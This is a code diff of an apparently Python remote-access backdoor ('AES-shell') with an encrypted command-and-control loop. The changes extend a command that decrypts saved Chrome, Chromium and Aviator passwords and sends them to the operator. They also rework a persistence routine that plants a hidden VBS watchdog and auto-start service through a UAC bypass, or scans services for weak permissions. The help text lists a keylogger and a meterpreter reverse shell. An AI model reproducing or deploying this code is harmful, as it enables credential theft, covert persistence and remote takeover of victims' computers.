@@ -272,27 +272,43 @@ while 1:
 	# 	s.send(encrypted)
 	# 	os.remove(upfile)
 
-	elif decrypted.startswith("chromepass"): 
+	elif decrypted.startswith("chromepass"):
 		if pwdvar == 'cd':
 			sendpass = ''
 			appdata = os.getenv("APPDATA")
-			try:
-				connection = sqlite3.connect(appdata + "%s..%sLocal%sGoogle%sChrome%sUser Data%sDefault%sLogin Data" % (os.sep,os.sep,os.sep,os.sep,os.sep,os.sep,os.sep))
-				cursor = connection.cursor()
-				cursor.execute('SELECT origin_url, action_url, username_value, password_value FROM logins')
-				for information in cursor.fetchall():
-					passw = win32crypt.CryptUnprotectData(information[3], None, None, None, 0)[1]
-					if passw:
-						sendpass += '**n [*] Website-origin: ' + information[0] + '**n [*] Website-action: ' + information[1]
-						sendpass += '**n [*] Username: ' + information[2]
-						sendpass += '**n [*] Password: ' + passw + '**n'
-				if len(sendpass) > 15:
-					encrypted = EncodeAES(cipher, "%s**nEOFEOFEOFEOFEOFX" % (sendpass))
-				else:
-					encrypted = EncodeAES(cipher, " [X] No stored passwords found.**nEOFEOFEOFEOFEOFX")
+			paths = []
+			if os.path.isfile(appdata + "%s..%sLocal%sGoogle%sChrome%sUser Data%sDefault%sLogin Data" % (os.sep,os.sep,os.sep,os.sep,os.sep,os.sep,os.sep)):
+				paths.append([appdata + "%s..%sLocal%sGoogle%sChrome%sUser Data%sDefault%sLogin Data" % (os.sep,os.sep,os.sep,os.sep,os.sep,os.sep,os.sep), 'Chrome'])
+
+			if os.path.isfile(appdata + "%s..%sLocal%sChromium%sUser Data%sDefault%sLogin Data" % (os.sep,os.sep,os.sep,os.sep,os.sep,os.sep)):
+				paths.append([appdata + "%s..%sLocal%sChromium%sUser Data%sDefault%sLogin Data" % (os.sep,os.sep,os.sep,os.sep,os.sep,os.sep), 'Chromium'])
+
+			if os.path.isfile(appdata + "%s..%sLocal%sAviator%sUser Data%sDefault%sLogin Data" % (os.sep,os.sep,os.sep,os.sep,os.sep,os.sep)):
+				paths.append([appdata + "%s..%sLocal%sAviator%sUser Data%sDefault%sLogin Data" % (os.sep,os.sep,os.sep,os.sep,os.sep,os.sep), 'Aviator']) 
+
+			if len(paths) > 0:
+				for passpath in paths:
+					sendpass, sendit = '', ''
+					connection = sqlite3.connect(passpath[0])
+					cursor = connection.cursor()
+					cursor.execute('SELECT origin_url, action_url, username_value, password_value FROM logins')
+					for information in cursor.fetchall():
+						passw = win32crypt.CryptUnprotectData(information[3], None, None, None, 0)[1]
+						if passw:
+							sendpass += ' [*] Website-origin: ' + information[0]
+							sendpass += '**n [*] Website-action: ' + information[1]
+							sendpass += '**n [*] Username: ' + information[2]
+							sendpass += '**n [*] Password: ' + passw + '**n'
+					if sendpass:
+						sendit += '**n [*] Passwords found for %s:**n' % (passpath[1])
+						sendit += sendpass
+					else:
+						sendit += '**n [X] No passwords found for %s**n' % (passpath[1])
+				sendit += '**nEOFEOFEOFEOFEOFX'
+				encrypted = EncodeAES(cipher, sendit)
 				s.send(encrypted)
-			except Exception as e:
-				encrypted = EncodeAES(cipher, str(e) + "**nEOFEOFEOFEOFEOFX")
+			else:
+				encrypted =  EncodeAES(cipher, ' [X] Chrome, Chromium and Aviator are not installed.**nEOFEOFEOFEOFEOFX' % (passpath))
 				s.send(encrypted)
 		else:
 			encrypted = EncodeAES(cipher, " [X] Error: chromepass command is only available on windows.**nEOFEOFEOFEOFEOFX")
@@ -326,43 +342,48 @@ while 1:
 			s.send(encrypted)
 
 	elif decrypted.startswith("persistence"):
-		if isAdmin:
-			if not os.path.isfile(vbsdst):
-				vbscript = 'state = 1**nhidden = 0**nwshname = "' + agent + '"**nvbsname = "' + vbsdst + '"**nWhile state = 1**nexist = ReportFileStatus(wshname)**nIf exist = True then**nset objFSO = CreateObject("Scripting.FileSystemObject")**nset objFile = objFSO.GetFile(wshname)**nset objFSO = CreateObject("Scripting.FileSystemObject")**nset objFile = objFSO.GetFile(vbsname)**nSet WshShell = WScript.CreateObject ("WScript.Shell")**nSet colProcessList = GetObject("Winmgmts:").ExecQuery ("Select * from Win32_Process")**nFor Each objProcess in colProcessList**nif objProcess.name = "' + agentname + '" then**nvFound = True**nEnd if**nNext**nIf vFound = True then**nwscript.sleep 7000**nElse**nWshShell.Run """' + agent + '""",hidden**nwscript.sleep 7000**nEnd If**nvFound = False**nElse**nwscript.sleep 7000**nEnd If**nWend**nFunction ReportFileStatus(filespec)**nDim fso, msg**nSet fso = CreateObject("Scripting.FileSystemObject")**nIf (fso.FileExists(filespec)) Then**nmsg = True**nElse**nmsg = False**nEnd If**nReportFileStatus = msg**nEnd Function**n'
-				with open(vbsdst, 'w') as pv:
-					pv.write(vbscript)
-				win32api.SetFileAttributes(vbsdst,win32con.FILE_ATTRIBUTE_HIDDEN)
-				cmds = "copy " + sys.argv[0] + ' ' + agent + '**n'
-				cmds += 'sc create win32svc binPath= "cmd.exe /c wscript.exe ' + vbsdst + '" type= own start= auto**n'
-				cmds += 'del ' + tempvbs + '**n'
-				cmds += 'del /AH "%~f0" & sc start win32svc**n'
-				hb = 'CreateObject("Wscript.Shell").Run """" & WScript.Arguments(0) & """", 0, False**n'
-				with open(tempvbs, 'w') as hid:
-					hid.write(hb)
-				with open(tempbat, 'w') as cbat:
-					cbat.write(cmds)
-				win32api.SetFileAttributes(tempvbs,win32con.FILE_ATTRIBUTE_HIDDEN)
-				win32api.SetFileAttributes(tempbat,win32con.FILE_ATTRIBUTE_HIDDEN)
-				rcmd = tempvbs + ' ' + tempbat
-				fbypass(rcmd)
-			else:
-				fbypass('sc start win32svc')
+		if os.name == 'nt':
+			if isAdmin:																					## If the current user is admin we will use bypassuac to install a system service with a vbs script that keeps our agent alive ;)
+				if not os.path.isfile(vbsdst):
+					vbscript = 'state = 1**nhidden = 0**nwshname = "' + agent + '"**nvbsname = "' + vbsdst + '"**nWhile state = 1**nexist = ReportFileStatus(wshname)**nIf exist = True then**nset objFSO = CreateObject("Scripting.FileSystemObject")**nset objFile = objFSO.GetFile(wshname)**nset objFSO = CreateObject("Scripting.FileSystemObject")**nset objFile = objFSO.GetFile(vbsname)**nSet WshShell = WScript.CreateObject ("WScript.Shell")**nSet colProcessList = GetObject("Winmgmts:").ExecQuery ("Select * from Win32_Process")**nFor Each objProcess in colProcessList**nif objProcess.name = "' + agentname + '" then**nvFound = True**nEnd if**nNext**nIf vFound = True then**nwscript.sleep 7000**nElse**nWshShell.Run """' + agent + '""",hidden**nwscript.sleep 7000**nEnd If**nvFound = False**nElse**nwscript.sleep 7000**nEnd If**nWend**nFunction ReportFileStatus(filespec)**nDim fso, msg**nSet fso = CreateObject("Scripting.FileSystemObject")**nIf (fso.FileExists(filespec)) Then**nmsg = True**nElse**nmsg = False**nEnd If**nReportFileStatus = msg**nEnd Function**n'
+					with open(vbsdst, 'w') as pv:
+						pv.write(vbscript)
+					win32api.SetFileAttributes(vbsdst,win32con.FILE_ATTRIBUTE_HIDDEN)
+					cmds = "copy " + sys.argv[0] + ' ' + agent + '**n'
+					cmds += 'sc create win32svc binPath= "cmd.exe /c wscript.exe ' + vbsdst + '" type= own start= auto**n'
+					cmds += 'del ' + tempvbs + '**n'
+					cmds += 'del /AH "%~f0" & sc start win32svc**n'
+					hb = 'CreateObject("Wscript.Shell").Run """" & WScript.Arguments(0) & """", 0, False**n'
+					with open(tempvbs, 'w') as hid:
+						hid.write(hb)
+					with open(tempbat, 'w') as cbat:
+						cbat.write(cmds)
+					win32api.SetFileAttributes(tempvbs,win32con.FILE_ATTRIBUTE_HIDDEN)
+					win32api.SetFileAttributes(tempbat,win32con.FILE_ATTRIBUTE_HIDDEN)
+					rcmd = tempvbs + ' ' + tempbat
+					fbypass(rcmd)
+					exit()
+				else:
+					fbypass('sc start win32svc')
+			else:																						## As a regualr user all we can do is search for system services with weak directory permisssions
+				vulnpaths = ''
+				winservices = fsubprocess(''' + complexcommand + ''')
+				for line in winservices.split('**n'):
+					if line:
+						if line[0] == '"':
+							line = '"' + line.split('"')[1].strip('**r') + '"'
+						else:
+							line = '"' + line.split('/')[0].strip('**r') + '"'
+						out = fsubprocess('icacls ' + line)
+						if out.find("BUILTIN" + os.sep + "Users:(I)(F)") != -1 or out.find("BUILTIN" + os.sep + "Users:(F)") != -1:
+							vulnpaths += line + '**n'
+				if vulnpaths:
+					encrypted = EncodeAES(cipher, " [*] Windows services with weak directory permissions:**n**n%sEOFEOFEOFEOFEOFX" % (vulnpaths))
+				else:
+					encrypted = EncodeAES(cipher, " [X] No services with weak directory permissions found.**nEOFEOFEOFEOFEOFX")
+				s.send(encrypted)
 		else:
-			vulnpaths = ''
-			winservices = fsubprocess(''' + complexcommand + ''')
-			for line in winservices.split('**n'):
-				if line:
-					if line[0] == '"':
-						line = '"' + line.split('"')[1].strip('**r') + '"'
-					else:
-						line = '"' + line.split('/')[0].strip('**r') + '"'
-					out = fsubprocess('icacls ' + line)
-					if out.find("BUILTIN" + os.sep + "Users:(I)(F)") != -1 or out.find("BUILTIN" + os.sep + "Users:(F)") != -1:
-						vulnpaths += line + '**n'
-			if vulnpaths:
-				encrypted = EncodeAES(cipher, " [*] Windows services with weak directory permissions:**n**n%sEOFEOFEOFEOFEOFX" % (vulnpaths))
-			else:
-				encrypted = EncodeAES(cipher, " [X] No services with weak directory permissions found.**nEOFEOFEOFEOFEOFX")
+			encrypted = EncodeAES(cipher, " [X] Persistence is only available for windows.**nEOFEOFEOFEOFEOFX")
 			s.send(encrypted)
 
 	elif decrypted.startswith("bypassuac "):
@@ -385,11 +406,11 @@ while 1:
 			url = decrypted.split(' ')[1]
 			Wget(url)
 			encrypted = EncodeAES(cipher, " [*] %s downloaded.**nEOFEOFEOFEOFEOFX" % (url.split('/')[-1]))
-		except Exception as e:
-			encrypted = EncodeAES(cipher, " [X] Could not download %s.**nEOFEOFEOFEOFEOFX" % (e))
+		except:
+			encrypted = EncodeAES(cipher, " [X] Could not download %s.**nEOFEOFEOFEOFEOFX" % (url))
 		s.send(encrypted)
 
-	elif decrypted.startswith("EOFEOFEOFEOFEOFS"):
+	elif decrypted.startswith("EOFEOFEOFEOFEOFS"):													## Data starting with this code indicates we are to receive a file
 		ufilename = pwd.strip('**r') + os.sep + decrypted[16:32].strip('*')
 		f = open(ufilename, 'wb')
 		f.write(decrypted[32:])
@@ -412,7 +433,7 @@ while 1:
 		s.send(encrypted)
 
 	else:
-		cmd = 'cd %s&&%s&&%s' % (pwd, decrypted, pwdvar)
+		cmd = 'cd %s&&%s&&%s' % (pwd, decrypted, pwdvar)												## This is how we maintain pwd
 		stdout = fsubprocess(cmd)
 		if 'is not recognized as an internal' not in stdout and ': not found' not in stdout:
 			checkpath = ''.join(stdout.split('**n')[-2:]).strip('**n')
@@ -547,7 +568,7 @@ def fnextcmd():
 		encrypted = EncodeAES(cipher, nextcmd)
 		s.send(encrypted)
 
-def fmainloop(first):
+def fmainloop(first):											## This loop is used to accept a new connection
 	global iv, cipher, s, address
 	if first:
 		print ' [>] Listening for connection on %s' % (listenport)
@@ -573,7 +594,7 @@ def fmainloop(first):
 				continue
 
 def fhelp():
-	return '**n AES-shell options:**n  download file       -  Download a file from remote pwd to localhost.**n  upload filepath     -  Upload a filepath to remote pwd.**n  run commands        -  Run a command in the background.**n  wget url            -  Download a file from url to remote pwd.**n**n Windows Only:**n  persistence         -  Install exe as a system service backdoor.**n  meterpreter ip:port -  Execute a reverse_tcp meterpreter to ip:port.**n  keyscan             -  Start recording keystrokes.**n  keydump             -  Dump recorded keystrokes.**n  keyclear            -  Clear the keystroke buffer.**n  chromepass          -  Retrieve chrome stored passwords.**n  bypassuac cmds      -  Run commands as admin.**n'
+	return '**n AES-shell options:**n  download file       -  Download a file from remote pwd to localhost.**n  upload filepath     -  Upload a filepath to remote pwd.**n  run commands        -  Run a command in the background.**n  wget url            -  Download a file from url to remote pwd.**n**n Windows Only:**n  persistence         -  Install exe as a system service backdoor.**n  meterpreter ip:port -  Execute a reverse_tcp meterpreter to ip:port.**n  keyscan             -  Start recording keystrokes.**n  keydump             -  Dump recorded keystrokes.**n  keyclear            -  Clear the keystroke buffer.**n  chromepass          -  Retrieve chrome, chromium and aviator stored passwords.**n  bypassuac cmds      -  Run commands as admin.**n'
 
 commands = ['download ', 'upload ', 'meterpreter ', 'keyscan', 'keydump', 'keyclear', 'run ', 'chromepass', 'help', 'bypassuac ', 'persistence', 'wget ']
 readline.parse_and_bind("tab: complete")
@@ -596,17 +617,17 @@ fmainloop(True)
 while True:
 	try:
 		data = s.recv(2048)
-		if data.startswith("GET / HTTP/1.1**r**n**r**n"):
+		if data.startswith("GET / HTTP/1.1**r**n**r**n"):		## Check if host is connecting through proxy
 			data = data[18:]
 			isProxied = True
 		decrypted = DecodeAES(cipher, data)
 	except:
 		pass
-	if decrypted.endswith("EOFEOFEOFEOFEOFX"):
+	if decrypted.endswith("EOFEOFEOFEOFEOFX"):					## Data ending in this code indicates we should print the data
 		print decrypted[:-16]
 		fnextcmd()
 
-	elif decrypted.endswith('*' * 16):
+	elif decrypted.endswith('*' * 16):							## Get system info
 		opsys = decrypted[64:128].strip('*')
 		if decrypted[143:144] == 'Y':
 			is64 = True
@@ -634,7 +655,7 @@ while True:
 		print ' [*] User is %s, System is %s %s.**n' % (uservar, archvar, opsys)
 		fnextcmd()
 
-	elif decrypted[16:32] == "EOFEOFEOFEOFEOFS":
+	elif decrypted[16:32] == "EOFEOFEOFEOFEOFS":				## Download a file
 		print ' [*] AES-Encrypted file (%s) received!**n' % (downfile)
 		f = open(downfile, 'wb')
 		f.write(decrypted[32:])
@@ -648,11 +669,11 @@ while True:
 		f.close()
 		fnextcmd()
 
-	elif decrypted[28:32] == 'WTF1':
+	elif decrypted[28:32] == 'WTF1':							## Print the output of bypassuac commands
 		print decrypted[32:]
 		fnextcmd()
 
-	else:
+	else:														## Print the normal output
 		if decrypted:
 			print decrypted
 	try:
